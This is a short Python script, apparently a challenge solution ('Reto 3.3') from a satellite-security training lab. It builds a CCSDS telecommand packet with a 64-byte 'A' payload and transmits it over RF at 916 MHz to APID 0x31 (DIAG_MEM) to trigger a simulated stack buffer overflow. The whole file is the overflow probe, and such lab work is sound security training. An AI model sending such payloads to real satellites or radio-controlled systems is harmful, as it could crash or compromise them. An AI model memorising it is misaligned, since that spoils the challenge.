#!/usr/bin/env python3
"""
Reto 3.3: Stack Buffer Overflow (RF Over-The-Air Variant)
Sends an oversized payload (> 32 bytes) to APID 0x31 (DIAG_MEM) over RF (916.0 MHz).
"""
import os
import sys

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../lib")))
from pwnsat_rf import FlatSatRF
from pwnsat_packets import build_ccsds_packet

def main():
    print("[+] Reto 3.3: Stack Buffer Overflow Scan Probe (Over-The-Air RF Variant)")
    rf = FlatSatRF(freq=916000000)
    
    # Payload > 32 bytes to trigger simulated stack buffer overflow (DIAG_MEM / APID 0x31)
    overflow_payload = b"A" * 64
    pkt = build_ccsds_packet(apid=0x31, payload=overflow_payload)
    
    print(f"[*] Transmitting 64-byte payload to APID 0x31 (DIAG_MEM) over RF (916.0 MHz)...")
    if rf.transmit_rf(pkt):
        print("[✓] Stack Buffer Overflow telecommand frame transmitted over RF.")
    else:
        print("[X] Failed to transmit telecommand over RF.")
    rf.close()

if __name__ == "__main__":
    main()
